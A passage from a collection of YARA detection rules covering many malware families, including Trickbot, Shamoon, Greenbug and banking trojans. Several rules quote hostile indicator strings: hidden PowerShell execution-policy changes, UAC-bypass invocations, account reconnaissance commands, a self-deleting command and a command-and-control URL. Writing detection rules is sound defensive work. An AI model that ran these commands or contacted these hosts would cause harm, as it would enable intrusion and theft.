reference = "http://www.alienvault.com/open-threat-exchange/blog/botnet-bruteforcing-point-of-sale-via-remote-desktop"
date = "3/11/2014"
description = "botnet bruteforcing POS terms via RDP"
strings:
$type="Microsoft-Windows-Security-Auditing"
$eventid="4688"
$data="\\AppData\\Roaming\\lsacs.exe"
condition:
all of them
}
rule SSC_blackpos_v2
{
meta:
author = "@patrickrolsen"
version = "0.1"
reference = "http://blog.nuix.com/2014/09/08/blackpos-v2-new-variant-or-different-family"
strings:
$s1 = "Usage: -[start|stop|install|uninstall"
$s2 = "\\SYSTEM32\\sc.exe config LanmanWorkstation"
$s3 = "t.bat"
$s4 = "mcfmisvc"
condition:
uint16(0) == 0x5A4D and all of ($s*)
}
rule SSC_xDedic_SysScan_unpacked : crimeware {
meta:
author = " Kaspersky Lab"
ref = "https://securelist.com/files/2016/06/xDedic_marketplace_ENG.pdf"
maltype = "crimeware"
type ="crimeware"
filetype = "Win32 EXE"
date = "2016-03-14"
version = "1.0"
hash = "fac495be1c71012682ebb27092060b43"
hash = "e8cc69231e209db7968397e8a244d104"
hash = "a53847a51561a7e76fd034043b9aa36d"
hash = "e8691fa5872c528cd8e72b82e7880e98"
hash = "F661b50d45400e7052a2427919e2f777"
strings:
$a1="/c ping -n 2 127.0.0.1 & del \"SysScan.exe\"" ascii wide
$a2="SysScan DEBUG Mode!!!" ascii wide
$a3="This rechecking? (set 0/1 or press enter key)" ascii wide
$a4="http://37.49.224.144:8189/manual_result" ascii wide
$b1="Checker end work!" ascii wide
$b2="Trying send result..." ascii wide
condition:
((uint16(0) == 0x5A4D)) and (filesize < 5000000) and
((any of ($a*)) or (all of ($b*)))
}
rule SSC_viotto_keylogger
{
strings:
$hdr = "MZ"
$s1 = "Viotto Keylogger"
$s2 = "msvbvm60"
$s3 = "FtpPutFileA"
$s4 = "VBA6"
$s5 = "SetWindowsHookExA"
condition:
($hdr at 0) and all of ($s*)
}
rule SSC_YayihCode : Yayih Family
{
meta:
description = "Yayih code features"
author = "Seth Hardy"
last_modified = "2014-07-11"
strings:
//  encryption
$ = { 80 04 08 7A 03 C1 8B 45 FC 80 34 08 19 03 C1 41 3B 0A 7C E9 }
condition:
any of them
}
rule SSC_YayihStrings : Yayih Family
{
meta:
description = "Yayih Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-07-11"
strings:
$ = "/bbs/info.asp"
$ = "\\msinfo.exe"
$ = "%s\\%srcs.pdf"
$ = "\\aumLib.ini"
condition:
any of them
}
rule SSC_Windows_Malware : Zeus_1134
{
meta:
author = "Xylitol xylitol@malwareint.com"
date = "2014-03-03"
description = "Match first two bytes, protocol and string present in Zeus 1.1.3.4"
reference = "http://www.xylibox.com/2014/03/zeus-1134.html"
strings:
$mz = {4D 5A}
$protocol1 = "X_ID: "
$protocol2 = "X_OS: "
$protocol3 = "X_BV: "
$stringR1 = "InitializeSecurityDescriptor"
$stringR2 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1)"
condition:
($mz at 0 and all of ($protocol*) and ($stringR1 or $stringR2))
}
rule SSC_Mirage_APT
{
meta:
Author      = "Silas Cutler"
Date        = "yyyy/mm/dd"
Description = "Malware related to APT campaign"
Reference   = "Useful link"
strings:
$a1 = "welcome to the desert of the real"
$a2 = "Mirage"
$b = "Encoding: gzip"
$c = /\/[A-Za-z]*\?hl=en/
condition:
(($a1 or $a2) or $b) and $c
}
rule SSC_MirageStrings
{
meta:
description = "Mirage Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-25"
strings:
$ = "Neo,welcome to the desert of real." wide ascii
$ = "/result?hl=en&id=%s"
condition:
any of them
}
rule SSC_Zegost : Trojan
{
meta:
author="Kevin Falcoz"
date="10/06/2013"
description="Zegost Trojan"
strings:
$signature1={39 2F 66 33 30 4C 69 35 75 62 4F 35 44 4E 41 44 44 78 47 38 73 37 36 32 74 71 59 3D}
$signature2={00 BA DA 22 51 42 6F 6D 65 00}
condition:
$signature1 and $signature2
}
rule SSC_XOR_DDosv1 : DDoS
{
meta:
author = "Akamai CSIRT"
description = "Rule to detect XOR DDos infection"
strings:
$st0 = "BB2FA36AAA9541F0"
$st1 = "md5="
$st2 = "denyip="
$st3 = "filename="
$st4 = "rmfile="
$st5 = "exec_packet"
$st6 = "build_iphdr"
condition:
all of them
}
rule SSC_Wabot : Worm
{
meta:
author="Kevin Falcoz"
date="14/08/2015"
description="Wabot Trojan Worm"
strings:
$signature1={43 3A 5C 6D 61 72 69 6A 75 61 6E 61 2E 74 78 74}
$signature2={73 49 52 43 34}
condition:
$signature1 and $signature2
}
rule SSC_VidgrabCode : Vidgrab Family
{
meta:
description = "Vidgrab code tricks"
author = "Seth Hardy"
last_modified = "2014-06-20"
strings:
$divbyzero = { B8 02 00 00 00 48 48 BA 02 00 00 00 83 F2 02 F7 F0 }
// add eax, ecx; xor byte ptr [eax], ??h; inc ecx
$xorloop = { 03 C1 80 30 (66 | 58) 41 }
$junk = { 8B 4? ?? 8B 4? ?? 03 45 08 52 5A }
condition:
all of them
}
rule SSC_VidgrabStrings : Vidgrab Family
{
meta:
description = "Vidgrab Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-20"
strings:
$ = "IDI_ICON5" wide ascii
$ = "starter.exe"
$ = "wmifw.exe"
$ = "Software\\rar"
$ = "tmp092.tmp"
$ = "temp1.exe"
condition:
3 of them
}
rule SSC_urausy_skype_dat : memory {
meta:
author = "AlienVault Labs"
description = "Yara rule to match against memory of processes infected by Urausy skype.dat"
strings:
$a = "skype.dat" ascii wide
$b = "skype.ini" ascii wide
$win1 = "CreateWindow"
$win2 = "YIWEFHIWQ" ascii wide
$desk1 = "CreateDesktop"
$desk2 = "MyDesktop" ascii wide
condition:
$a and $b and (all of ($win*) or all of ($desk*))
}
rule SSC_MALW_trickbot_bankBot : Trojan
{
meta:
author = "Marc Salinas @Bondey_m"
description = "Detects Trickbot Banking Trojan"
strings:
$str_trick_01 = "moduleconfig"
$str_trick_02 = "Start"
$str_trick_03 = "Control"
$str_trick_04 = "FreeBuffer"
$str_trick_05 = "Release"
condition:
all of ($str_trick_*)
}
rule SSC_MALW_systeminfo_trickbot_module :
Trojan
{
meta:
author = "Marc Salinas @Bondey_m"
description = "Detects systeminfo module from Trickbot Trojan"
strings:
$str_systeminf_01 = "<program>"
$str_systeminf_02 = "<service>"
$str_systeminf_03 = "</systeminfo>"
$str_systeminf_04 =
"GetSystemInfo.pdb"
$str_systeminf_05 = "</autostart>"
$str_systeminf_06 = "</moduleconfig>"
condition:
all of ($str_systeminf_*)
}
rule SSC_MALW_dllinject_trickbot_module : Trojan
{
meta:
author = "Marc Salinas @Bondey_m"
description = " Detects dllinject module from Trickbot Trojan"
strings:
$str_dllinj_01 = "user_pref("
$str_dllinj_02 = "<ignore_mask>"
$str_dllinj_03 = "<require_header>"
$str_dllinj_04 = "</dinj>"
condition:
all of ($str_dllinj_*)
}
rule SSC_ELF_Linux_Torte_domains {
meta:
author = "@mmorenog,@yararules"
description = "Detects ELF Linux/Torte infection"
ref1 = "http://blog.malwaremustdie.org/2016/01/mmd-0050-2016-incident-report-elf.html"
strings:
$1 = "pages.touchpadz.com" ascii wide nocase
$2 = "bat.touchpadz.com" ascii wide nocase
$3 = "stat.touchpadz.com" ascii wide nocase
$4 = "sk2.touchpadz.com" ascii wide nocase
condition:
any of them
}
rule SSC_Tinba2 : banking {
meta:
author = "n3sfox <n3sfox@gmail.com>"
date = "2015/11/07"
description = "Tinba 2 (DGA) banking trojan"
reference = "https://securityintelligence.com/tinba-malware-reloaded-and-attacking-banks-around-the-world"
filetype = "memory"
hash1 = "c7f662594f07776ab047b322150f6ed0"
hash2 = "dc71ef1e55f1ddb36b3c41b1b95ae586"
hash3 = "b788155cb82a7600f2ed1965cffc1e88"
strings:
$str1 = "MapViewOfFile"
$str2 = "OpenFileMapping"
$str3 = "NtCreateUserProcess"
$str4 = "NtQueryDirectoryFile"
$str5 = "RtlCreateUserThread"
$str6 = "DeleteUrlCacheEntry"
$str7 = "PR_Read"
$str8 = "PR_Write"
$pubkey = "BEGIN PUBLIC KEY"
$code1 = {50 87 44 24 04 6A ?? E8}
condition:
all of ($str*) and $pubkey and $code1
}
rule SSC_Tedroo : Spammer
{
meta:
author="Kevin Falcoz"
date="22/11/2015"
description="Tedroo Spammer"
strings:
$signature1={25 73 25 73 2E 65 78 65}
$signature2={5F 6C 6F 67 2E 74 78 74}
condition:
$signature1 and $signature2
}
rule SSC_T5000Strings : T5000 Family
{
meta:
description = "T5000 Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-26"
strings:
$ = "_tmpR.vbs"
$ = "_tmpg.vbs"
$ = "Dtl.dat" wide ascii
$ = "3C6FB3CA-69B1-454f-8B2F-BD157762810E"
$ = "EED5CA6C-9958-4611-B7A7-1238F2E1B17E"
$ = "8A8FF8AD-D1DE-4cef-B87C-82627677662E"
$ = "43EE34A9-9063-4d2c-AACD-F5C62B849089"
$ = "A8859547-C62D-4e8b-A82D-BE1479C684C9"
$ = "A59CF429-D0DD-4207-88A1-04090680F714"
$ = "utd_CE31" wide ascii
$ = "f:\\Project\\T5000\\Src\\Target\\1 KjetDll.pdb"
$ = "l:\\MyProject\\Vc 7.1\\T5000\\T5000Ver1.28\\Target\\4 CaptureDLL.pdb"
$ = "f:\\Project\\T5000\\Src\\Target\\4 CaptureDLL.pdb"
$ = "E:\\VS2010\\xPlat2\\Release\\InstRes32.pdb"
condition:
any of them
}
rule SSC_RSharedStrings : Surtr Family {
meta:
description = "identifiers for remote and gmremote"
author = "Katie Kleemola"
last_updated = "07-21-2014"
strings:
$ = "nView_DiskLoydb" wide
$ = "nView_KeyLoydb" wide
$ = "nView_skins" wide
$ = "UsbLoydb" wide
$ = "%sBurn%s" wide
$ = "soul" wide
condition:
any of them
}
rule SSC_GmRemoteStrings : GmRemote Variant Family Surtr {
meta:
description = "identifiers for gmremote: surtr stage 2"
author = "Katie Kleemola"
last_updated = "07-21-2014"
strings:
$ = "\x00x86_GmRemote.dll\x00"
$ = "\x00D:\\Project\\GTProject\\Public\\List\\ListManager.cpp\x00"
$ = "\x00GmShutPoint\x00"
$ = "\x00GmRecvPoint\x00"
$ = "\x00GmInitPoint\x00"
$ = "\x00GmVerPoint\x00"
$ = "\x00GmNumPoint\x00"
$ = "_Gt_Remote_" wide
$ = "%sBurn\\workdll.tmp" wide
condition:
any of them
}
rule SSC_RemoteStrings : Remote Variant Surtr Family {
meta:
description = "indicators for remote.dll - surtr stage 2"
author = "Katie Kleemola"
last_updated = "07-21-2014"
strings:
$ = "\x00Remote.dll\x00"
$ = "\x00CGm_PlugBase::"
$ = "\x00ServiceMain\x00_K_H_K_UH\x00"
$ = "\x00_Remote_\x00" wide
condition:
any of them
}
rule SSC_SurtrStrings : Surtr Family {
meta:
author = "Katie Kleemola"
description = "Strings for Surtr"
last_updated = "2014-07-16"
strings:
$ = "\x00soul\x00"
$ = "\x00InstallDll.dll\x00"
$ = "\x00_One.dll\x00"
$ = "_Fra.dll"
$ = "CrtRunTime.log"
$ = "Prod.t"
$ = "Proe.t"
$ = "Burn\\"
$ = "LiveUpdata_Mem\\"
condition:
any of them
}
rule SSC_SurtrCode : Surtr Family {
meta:
author = "Katie Kleemola"
description = "Code features for Surtr Stage1"
last_updated = "2014-07-16"
strings:
//decrypt config
$ = { 8A ?? ?? 84 ?? ?? 74 ?? 3C 01 74 ?? 34 01 88 41 3B ?? 72 ?? }
//if Burn folder name is not in strings
$ = { C6 [3] 42 C6 [3] 75 C6 [3] 72 C6 [3] 6E C6 [3] 5C }
//mov char in _Fire
$ = { C6 [3] 5F C6 [3] 46 C6 [3] 69 C6 [3] 72 C6 [3] 65 C6 [3] 2E C6 [3] 64 }
condition:
any of them
}
rule SSC_moleransomware_campaign {
strings:
$a = "Decrypting of your files is only possible with the private key and decrypt program, which is on our secret server." nocase wide ascii
$b = "click on the chrome_font.exe" nocase wide ascii
condition:
any of them
}
rule SSC_unk_packer
{
meta:
author = "pekeinfo"
date = "2017-02-22"
description = "Spora & Cerber ek"
strings:
$a = {0E 9E 52 69 C8 E4 73 BF 87 2B 95 15 33 1B B7 6B 46 62 D8 C1 01 A9 F9 17 FC EF 1A 6E B7 36 3C C4 72 7D 5D 1A 2D C4 7E 70 E8 0A A0 C6 A3 51 C1 1C 5E 98 E2 72 19 DF 03 C9 D4 25 25 1F EF 6B 46 75 9C BB 1D D2 57 56 35 75 31 35 56 8F B7 5B 23 3D }
$b ={00 10 00 2E E8 77 EC FF FF 85 C0 0F 85 78 C4 FF}
condition:
$a and $b
}
rule SSC_Spora
{
meta:
author = "pekeinfo"
date = "2017-02-22"
description = "Spora"
strings:
$a={7B 7F 4E 11 5D F3 FE 15 F9 55 FD 00 AD E9 CF FE E2 56 78 03 D0 21 46 00 30 68 C4 D0 01 FD 00 C3 B7 00 4A 0D 57 D2 52 91 05}
$b={6F 51 3E 6B F9 15 29 D9 DF 26 1E 80 62 8A 0D E3 64 51 3B 0F F3 FE FF FF F3 FE FF FF F3 FE FF FF F3 FE FF FF}
condition:
$a and $b
}
rule SSC_Shifu_Banking_Trojan_0 : banking {
meta:
description = "Detects Shifu Banking Trojan"
author = "Florian Roth"
reference = "https://securityintelligence.com/shifu-masterful-new-banking-trojan-is-attacking-14-japanese-banks/"
date = "2015-09-01"
hash1 = "4ff1ebea2096f318a2252ebe1726bcf3bbc295da9204b6c720b5bbf14de14bb2"
hash2 = "4881c7d89c2b5e934d4741a653fbdaf87cc5e7571b68c723504069d519d8a737"
strings:
$x1 = "c:\\oil\\feet\\Seven\\Send\\Gather\\Dividerail.pdb" fullword ascii
$s1 = "listen above" fullword wide
$s2 = "familycould cost" fullword wide
$s3 = "SetSystemTimeAdjustment" fullword ascii /* Goodware String - occured 33 times */
$s4 = "PeekNamedPipe" fullword ascii /* Goodware String - occured 347 times */
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and ($x1 or all of ($s*))
}
rule SSC_SHIFU_Banking_Trojan_1 : banking {
meta:
description = "Detects SHIFU Banking Trojan"
author = "Florian Roth"
reference = "http://goo.gl/52n8WE"
date = "2015-10-31"
score = 70
hash1 = "0066d1c8053ff8b0c07418c7f8d20e5cd64007bb850944269f611febd0c1afe0"
hash2 = "3956d32a870d81be34cafc867769b2a2f55a96360070f1cb3d9addc2918357d5"
hash3 = "3fde1b2b50fcb36a695f1e6bc577cd930c2343066d98982cf982393e55bfce0d"
hash4 = "457ad4a4d4e675fe09f63873ca3364434dc872dde7d9b64ce7db919eaff47485"
hash5 = "51edba913e8b83d1388b1be975957e439015289d51d3d5774d501551f220df6f"
hash6 = "6611a2b79a3acf0003b1197aa5bfe488a33db69b663c79c6c5b023e86818d38b"
hash7 = "72e239924faebf8209f8e3d093f264f778a55efb56b619f26cea73b1c4feb7a4"
hash8 = "7a29cb641b9ac33d1bb405d364bc6e9c7ce3e218a8ff295b75ca0922cf418290"
hash9 = "92fe4f9a87c796e993820d1bda8040aced36e316de67c9c0c5fc71aadc41e0f8"
hash10 = "93ecb6bd7c76e1b66f8c176418e73e274e2c705986d4ac9ede9d25db4091ab05"
hash11 = "a0b7fac69a4eb32953c16597da753b15060f6eba452d150109ff8aabc2c56123"
hash12 = "a8b6e798116ce0b268e2c9afac61536b8722e86b958bd2ee95c6ecdec86130c9"
hash13 = "d6244c1177b679b3d67f6cec34fe0ae87fba21998d4f5024d8eeaf15ca242503"
hash14 = "dcc9c38e695ffd121e793c91ca611a4025a116321443297f710a47ce06afb36d"
strings:
$x1 = "\\Gather\\Dividerail.pdb" ascii
$s0 = "\\payload\\payload.x86.pdb" ascii
$s1 = "USER_PRIV_GUEST" fullword wide
$s2 = "USER_PRIV_ADMIN" fullword wide
$s3 = "USER_PRIV_USER" fullword wide
$s4 = "PPSWVPP" fullword ascii
$s5 = "WinSCard.dll" fullword ascii /* Goodware String - occured 83 times */
condition:
uint16(0) == 0x5a4d and ($x1 or 5 of ($s*))
}
rule SSC_Shifu : banking {
meta:
reference = "https://blogs.mcafee.com/mcafee-labs/japanese-banking-trojan-shifu-combines-malware-tools/"
author = "McAfee Labs"
strings:
$b = "RegCreateKeyA"
$a = "CryptCreateHash"
$c = {2F 00 63 00 20 00 73 00 74 00 61 00 72 00 74 00 20 00 22 00 22 00 20 00 22 00 25 00 73 00 22 00 20 00 25 00 73 00 00 00 00 00 63 00 6D 00 64 00 2E 00 65 00 78 00 65 00 00 00 72 00 75 00 6E}
$d = {53 00 6E 00 64 00 56 00 6F 00 6C 00 2E 00 65 00 78 00 65}
$e = {52 00 65 00 64 00 69 00 72 00 65 00 63 00 74 00 45 00 58 00 45}
condition:
all of them
}
rule SSC_Greenbug_Malware_2 {
meta:
description = "Detects Backdoor from Greenbug Incident"
author = "Florian Roth"
reference = "https://goo.gl/urp4CD"
date = "2017-01-25"
hash1 = "6b28a43eda5b6f828a65574e3f08a6d00e0acf84cbb94aac5cec5cd448a4649d"
hash2 = "21f5e60e9df6642dbbceca623ad59ad1778ea506b7932d75ea8db02230ce3685"
hash3 = "319a001d09ee9d754e8789116bbb21a3c624c999dae9cf83fde90a3fbe67ee6c"
strings:
$x1 = "|||Command executed successfully" fullword ascii
$x2 = "\\Release\\Bot Fresh.pdb" ascii
$x3 = "C:\\ddd\\a1.txt" fullword wide
$x4 = "Bots\\Bot5\\x64\\Release" ascii
$x5 = "Bot5\\Release\\Ism.pdb" ascii
$x6 = "Bot\\Release\\Ism.pdb" ascii
$x7 = "\\Bot Fresh\\Release\\Bot" ascii
$s1 = "/Home/SaveFile?commandId=CmdResult=" fullword wide
$s2 = "raB3G:Sun:Sunday:Mon:Monday:Tue:Tuesday:Wed:Wednesday:Thu:Thursday:Fri:Friday:Sat:Saturday" fullword ascii
$s3 = "Set-Cookie:\\b*{.+?}\\n" fullword wide
$s4 = "SELECT * FROM AntiVirusProduct" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 1000KB and ( 1 of ($x*) or 2 of them ) ) or ( 3 of them )
}
rule SSC_Greenbug_Malware_3 {
meta:
description = "Detects Backdoor from Greenbug Incident"
author = "Florian Roth"
reference = "https://goo.gl/urp4CD"
date = "2017-01-25"
super_rule = 1
hash1 = "44bdf5266b45185b6824898664fd0c0f2039cdcb48b390f150e71345cd867c49"
hash2 = "7f16824e7ad9ee1ad2debca2a22413cde08f02ee9f0d08d64eb4cb318538be9c"
strings:
$x1 = "F:\\Projects\\Bot\\Bot\\Release\\Ism.pdb" fullword ascii
$x2 = "C:\\ddd\\wer2.txt" fullword wide
$x3 = "\\Microsoft\\Windows\\tmp43hh11.txt" fullword wide
condition:
1 of them
}
rule SSC_Greenbug_Malware_5 {
meta:
description = "Auto-generated rule - from files 308a646f57c8be78e6a63ffea551a84b0ae877b23f28a660920c9ba82d57748f, 44bdf5266b45185b6824898664fd0c0f2039cdcb48b390f150e71345cd867c49, 7f16824e7ad9ee1ad2debca2a22413cde08f02ee9f0d08d64eb4cb318538be9c, 82beaef407f15f3c5b2013cb25901c9fab27b086cadd35149794a25dce8abcb9"
author = "Florian Roth"
reference = "https://goo.gl/urp4CD"
date = "2017-01-25"
super_rule = 1
hash1 = "308a646f57c8be78e6a63ffea551a84b0ae877b23f28a660920c9ba82d57748f"
hash2 = "44bdf5266b45185b6824898664fd0c0f2039cdcb48b390f150e71345cd867c49"
hash3 = "7f16824e7ad9ee1ad2debca2a22413cde08f02ee9f0d08d64eb4cb318538be9c"
hash4 = "82beaef407f15f3c5b2013cb25901c9fab27b086cadd35149794a25dce8abcb9"
strings:
$x1 = "cmd /u /c WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter" fullword ascii
$x2 = "cmd /a /c net user administrator /domain >>" fullword ascii
$x3 = "cmd /a /c netstat -ant >>\"%localappdata%\\Microsoft\\" fullword ascii
$o1 = "========================== (Net User) ==========================" ascii fullword
condition:
filesize < 2000KB and (
( uint16(0) == 0x5a4d and 1 of them ) or
$o1
)
}
rule SSC_Greenbug_Malware_1 {
meta:
description = "Detects Malware from Greenbug Incident"
author = "Florian Roth"
reference = "https://goo.gl/urp4CD"
date = "2017-01-25"
hash1 = "dab460a0b73e79299fbff2fa301420c1d97a36da7426acc0e903c70495db2b76"
strings:
$s1 = "vailablez" fullword ascii
$s2 = "Sfouglr" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 400KB and all of them )
}
rule SSC_Greenbug_Malware_4 {
meta:
description = "Detects ISMDoor Backdoor"
author = "Florian Roth"
reference = "https://goo.gl/urp4CD"
date = "2017-01-25"
super_rule = 1
hash1 = "308a646f57c8be78e6a63ffea551a84b0ae877b23f28a660920c9ba82d57748f"
hash2 = "82beaef407f15f3c5b2013cb25901c9fab27b086cadd35149794a25dce8abcb9"
strings:
$s1 = "powershell.exe -nologo -windowstyle hidden -c \"Set-ExecutionPolicy -scope currentuser" fullword ascii
$s2 = "powershell.exe -c \"Set-ExecutionPolicy -scope currentuser -ExecutionPolicy unrestricted -f; . \"" fullword ascii
$s3 = "c:\\windows\\temp\\tmp8873" fullword ascii
$s4 = "taskkill /im winit.exe /f" fullword ascii
$s5 = "invoke-psuacme"
$s6 = "-method oobe -payload \"\"" fullword ascii
$s7 = "C:\\ProgramData\\stat2.dat" fullword wide
$s8 = "Invoke-bypassuac" fullword ascii
$s9 = "Start Keylog Done" fullword wide
$s10 = "Microsoft\\Windows\\WinIt.exe" fullword ascii
$s11 = "Microsoft\\Windows\\Tmp9932u1.bat\"" fullword ascii
$s12 = "Microsoft\\Windows\\tmp43hh11.txt" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them ) or ( 3 of them )
}
rule SSC_Shamoon_Disttrack_Dropper {
meta:
description = "Detects Shamoon 2.0 Disttrack Dropper"
author = "Florian Roth"
reference = "https://goo.gl/jKIfGB"
date = "2016-12-01"
score = 70
hash1 = "4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6"
hash2 = "5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a"
strings:
$a1 = "\\#{9A6DB7D2-FECF-41ff-9A92-6EDA696613DF}#" wide
$a2 = "\\#{8A6DB7D2-FECF-41ff-9A92-6EDA696613DE}#" wide
$s1 = "\\amd64\\elrawdsk.pdb" fullword ascii
$s2 = "RawDiskSample.exe" fullword wide
$s3 = "RawDisk Driver. Allows write access to files and raw disk sectors for user mode applications in Windows 2000 and later." fullword wide
$s4 = "elrawdsk.sys" fullword wide
$s5 = "\\DosDevices\\ElRawDisk" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 90KB and 1 of ($a*) and 1 of ($s*) )
}
rule SSC_CrowdStrike_Shamoon_DroppedFile {
meta:
description = "Rule to detect Shamoon malware http://goo.gl/QTxohN"
reference = "http://www.rsaconference.com/writable/presentations/file_upload/exp-w01-hacking-exposed-day-of-destruction.pdf"
strings:
$testn123 = "test123" wide
$testn456 = "test456" wide
$testn789 = "test789" wide
$testdomain = "testdomain.com" wide $pingcmd = "ping -n 30 127.0.0.1 >nul" wide
condition:
(any of ($testn*) or $pingcmd) and $testdomain
}
rule SSC_Shamoon2_Wiper {
meta:
description = "Detects Shamoon 2.0 Wiper Component"
author = "Florian Roth"
reference = "https://goo.gl/jKIfGB"
date = "2016-12-01"
score = 70
hash1 = "c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a"
hash2 = "128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd"
strings:
$a1 = "\\??\\%s\\System32\\%s.exe" fullword wide
$x1 = "IWHBWWHVCIDBRAFUASIIWURRTWRTIBIVJDGWTRRREFDEAEBIAEBJGGCSVUHGVJUHADIEWAFGWADRUWDTJBHTSITDVVBCIDCWHRHVTDVCDESTHWSUAEHGTWTJWFIRTBRB" wide
$s1 = "UFWYNYNTS" fullword wide
$s2 = "\\\\?\\ElRawDisk" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them ) or ( 3 of them )
}
rule SSC_Shamoon2_ComComp {
meta:
description = "Detects Shamoon 2.0 Communication Components"
author = "Florian Roth (with Binar.ly)"
reference = "https://goo.gl/jKIfGB"
date = "2016-12-01"
score = 70
hash1 = "61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842"
strings:
$s1 = "mkdir %s%s > nul 2>&1" fullword ascii
$s2 = "p[%s%s%d.%s" fullword ascii
$op1 = { 04 32 cb 88 04 37 88 4c 37 01 88 54 37 02 83 c6 }
$op2 = { c8 02 d2 c0 e9 06 02 d2 24 3f 02 d1 88 45 fb 8d }
$op3 = { 0c 3b 40 8d 4e 01 47 3b c1 7c d8 83 fe 03 7d 1c }
condition:
uint16(0) == 0x5a4d and filesize < 500KB and ( all of ($s*) or all of ($op*) )
}
rule SSC_EldoS_RawDisk {
meta:
description = "EldoS Rawdisk Device Driver (Commercial raw disk access driver - used in Operation Shamoon 2.0)"
author = "Florian Roth (with Binar.ly)"
reference = "https://goo.gl/jKIfGB"
date = "2016-12-01"
score = 50
hash1 = "47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34"
hash2 = "394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b"
strings:
$s1 = "g\\system32\\" fullword wide
$s2 = "ztvttw" fullword wide
$s3 = "lwizvm" fullword ascii
$s4 = "FEJIKC" fullword ascii
$s5 = "INZQND" fullword ascii
$s6 = "IUTLOM" fullword wide
$s7 = "DKFKCK" fullword ascii
$op1 = { 94 35 77 73 03 40 eb e9 }
$op2 = { 80 7c 41 01 00 74 0a 3d }
$op3 = { 74 0a 3d 00 94 35 77 }
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and 4 of them )
}
rule SSC_sendsafe {
meta:
author = " J from THL <j@techhelplist.com>"
date = "2016/09"
reference = "http://pastebin.com/WPWWs406"
version = 2
maltype = "Spammer"
filetype = "memory"
strings:
$a = "Enterprise Mailing Service"
$b = "Blacklisted by rule: %s:%s"
$c = "/SuccessMails?CampaignNum=%ld"
$d = "/TimedOutMails?CampaignNum=%ld"
$e = "/InvalidMails?CampaignNum=%ld"
$f = "Failed to download maillist, retrying"
$g = "No maillist loaded"
$h = "Successfully sent using SMTP account %s (%d of %ld messages to %s)"
$i = "Successfully sent %d of %ld messages to %s"
$j = "Sending to %s in the same connection"
$k = "New connection required, will send to %s"
$l = "Mail transaction for %s is over."
$m = "Domain %s is bad (found in cache)"
$n = "Domain %s found in cache"
$o = "Domain %s isn't found in cache, resolving it"
$p = "All tries to resolve %s failed."
$q = "Failed to receive response for %s from DNS server"
$r = "Got DNS server response: domain %s is bad"
$s = "Got error %d in response for %s from DNS server"
$t = "MX's IP for domain %s found in cache:"
$u = "Timeout waiting for domain %s to be resolved"
$v = "No valid MXes for domain %s. Marking it as bad"
$w = "Resolving MX %s using existing connection to DNS server"
$x = "All tries to resolve MX for %s are failed"
$y = "Resolving MX %s using DNS server"
$z = "Failed to receive response for MX %s from DNS server"
condition:
13 of them
}
rule SSC_Vinsula_Sayad_Binder : infostealer binder
{
meta:
Author      = "Vinsula, Inc"
Date        = "2014/06/20"
Description = "Sayad Infostealer Binder"
Reference   = "http://vinsula.com/2014/07/20/sayad-flying-kitten-infostealer-malware/"
strings:
$pdbstr = "\\Projects\\C#\\Sayad\\Source\\Binder\\obj\\Debug\\Binder.pdb"
$delphinativestr = "DelphiNative.dll" nocase
$sqlite3str = "sqlite3.dll" nocase
$winexecstr = "WinExec"
$sayadconfig = "base.dll" wide
condition:
all of them
}
rule SSC_Vinsula_Sayad_Client : infostealer
{
meta:
Author      = "Vinsula, Inc"
Date        = "2014/06/20"
Description = "Sayad Infostealer Client"
Reference   = "http://vinsula.com/2014/07/20/sayad-flying-kitten-infostealer-malware/"
strings:
$pdbstr = "\\Projects\\C#\\Sayad\\Source\\Client\\bin\\x86\\Debug\\Client.pdb"
$sayadconfig = "base.dll" wide
$sqlite3str = "sqlite3.dll" nocase
$debugstr01 = "Config loaded" wide
$debugstr02 = "Config parsed" wide
$debugstr03 = "storage uploader" wide
$debugstr04 = "updater" wide
$debugstr05 = "keylogger" wide
$debugstr06 = "Screenshot" wide
$debugstr07 = "sqlite found & start collectiong data" wide
$debugstr08 = "Machine info collected" wide
$debugstr09 = "browser ok" wide
$debugstr10 = "messenger ok" wide
$debugstr11 = "vpn ok" wide
$debugstr12 = "ftp client ok" wide
$debugstr13 = "ftp server ok" wide
$debugstr14 = "rdp ok" wide
$debugstr15 = "kerio ok" wide
$debugstr16 = "skype ok" wide
$debugstr17 = "serialize data ok" wide
$debugstr18 = "Keylogged" wide
condition:
all of them
}
rule SSC_rovnix_downloader : downloader
{
meta:
author="Intel Security"
description="Rovnix downloader with sinkhole checks"
reference = "https://blogs.mcafee.com/mcafee-labs/rovnix-downloader-sinkhole-time-checks/"
strings:
$sink1= "control"
$sink2 = "sink"
$sink3 = "hole"
$sink4= "dynadot"
$sink5= "block"
$sink6= "malw"
$sink7= "anti"
$sink8= "googl"
$sink9= "hack"
$sink10= "trojan"
$sink11= "abuse"
$sink12= "virus"
$sink13= "black"
$sink14= "spam"
$boot= "BOOTKIT_DLL.dll"
$mz = { 4D 5A }
condition:
$mz in (0..2) and all of ($sink*) and $boot
}
rule SSC_RockLoader {
meta:
name = "RockLoader"
description = "RockLoader Malware"
author = "@seanmw"
strings:
$hdr = {4d 5a 90 00}
$op1 = {39 45 f0 0f 8e b0 00 00 00}
$op2 = {32 03 77 73 70 72 69 6e 74 66 41 00 ce 02 53 65}
condition:
$hdr at 0 and all of ($op*) and filesize < 500KB
}
rule SSC_Retefe
{
meta:
